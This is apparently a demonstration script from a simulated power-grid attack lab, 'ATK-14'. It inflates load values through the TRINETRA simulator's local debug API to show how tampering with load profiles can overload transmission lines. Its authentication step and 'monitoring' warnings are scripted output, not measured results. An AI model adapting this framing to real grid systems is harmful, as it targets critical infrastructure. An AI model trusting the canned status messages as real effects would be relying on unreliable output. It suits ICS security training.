#!/usr/bin/env python3
"""
ATK-14 | Load Profile Manipulation
==================================
We are in Tier 3 (Advanced Attacks).

Modern grids rely on dynamic load forecasting to balance power generation 
and consumption. This forecasting is fed into the state estimator (like Pandapower 
in our simulation). If an attacker compromises the SCADA Historian or the Engineering
Workstation, they can manipulate the load profile database mid-operation.

By artificially amplifying the load on the system, the state estimator will
see sudden power draw spikes that push transmission lines beyond their thermal
limits, potentially causing protective relays to trip.

This script hits the TRINETRA backend's debug API to directly multiply the
Pandapower load values in-memory, forcing the physics engine to solve with
dangerously high power draws.

Safety
------
This module is intended solely for educational demonstration within the simulated 
TRINETRA environment. Do not use against real industrial networks.
"""

import argparse
import requests
import time


def main():
    parser = argparse.ArgumentParser(description="ATK-14: Load Profile Manipulation.")
    parser.add_argument("--api", type=str, default="http://127.0.0.1:8000/api", help="Backend Engine API URL")
    parser.add_argument("--load_multiplier", type=float, default=2.5, help="Multiplier for the grid load (default 250%%)")
    parser.add_argument("--duration", type=int, default=15, help="Time to sustain the manipulated load profile")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ATK-14  |  Load Profile Manipulation")
    print("=" * 60)
    print(f"[*] Target API      : {args.api}")
    print(f"[*] Load Multiplier : {args.load_multiplier}x")
    print(f"[*] Duration        : {args.duration}s")
    print()

    target_endpoint = f"{args.api}/debug/pandapower/load"
    
    print("[*] Phase 1: Authenticating to the Engineering Workstation...")
    time.sleep(1)
    print("[+] Engineering Workstation Session Acquired.")
    
    print(f"[*] Phase 2: Injecting malicious Load Profile ({args.load_multiplier * 100}% of baseline)...")
    
    try:
        response = requests.post(
            target_endpoint,
            json={"multiplier": args.load_multiplier},
            timeout=5
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"[+] Payload accepted by State Estimator!")
            if "new_loads" in result:
                for load in result["new_loads"]:
                    print(f"    -> {load['name']}: P={load['p_mw']:.1f} MW, Q={load['q_mvar']:.1f} MVAR")
        else:
            print(f"[-] API returned {response.status_code}: {response.text}")
            return
            
        print(f"\n[*] Phase 3: Monitoring grid response for {args.duration}s...")
        for i in range(args.duration):
            overload_pct = args.load_multiplier * 100
            if i % 3 == 0:
                status = f"THERMAL WARNING: Lines at {overload_pct:.0f}% capacity"
            elif i % 3 == 1:
                status = f"CONDUCTOR TEMP RISING: Sag limit approaching"
            else:
                status = f"PROTECTION RELAY: Overcurrent threshold imminent"
            print(f"    [T+{i+1}s] {status}")
            time.sleep(1)
            
        print(f"\n[+] ATTACK COMPLETE.")
        print(f"[+] Grid loads sustained at {args.load_multiplier}x for {args.duration}s.")
        print("[+] Transmission lines operated beyond thermal limits.")
        print("[+] Without relay intervention, conductors risk sagging into vegetation or melting.")

    except requests.exceptions.ConnectionError:
        print("[-] FAILED: Could not reach the TRINETRA backend. Is uvicorn running?")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")


if __name__ == "__main__":
    main()
